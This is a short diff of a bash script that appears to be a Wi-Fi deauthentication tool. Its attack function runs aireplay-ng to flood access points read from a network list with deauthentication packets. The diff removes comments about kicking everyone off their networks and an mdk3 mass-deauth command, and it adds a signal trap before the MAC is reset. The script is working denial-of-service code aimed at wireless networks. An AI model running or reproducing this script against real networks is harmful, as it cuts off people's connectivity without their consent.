@@ -30,9 +30,6 @@ function attack(){
         PACKETS=$3
         echo "[*] Attacking ${ESSID} - ${SSID} on channel ${CHANNEL} with ${PACKETS} packets"
         aireplay-ng ${INTERFACE} -0 ${PACKETS} -a ${SSID} >/dev/null 2>&1 && return 0 || return 1
-        # Start kicking every-fucking-body out of their networks
-        # aireplay-ng ${INTERFACE} -0 ${PACKETS} -a ${SSID}
-        # mdk3 ${INTERFACE} d -w <whitelist> -c -> THIS WILL TARGET EVERYONE BUT THE MACs OF THE WHITELIST
 }
 
 # Checks the arguments passed to the tool
@@ -266,6 +263,7 @@ while IFS= read -r LINE; do
 done < deauther_networks.lst
 
 # Reset the MAC of the wireless interface
+trap '' 2
 resetMAC ${INTERFACE}
 
 # Put the wireless interface in managed mode
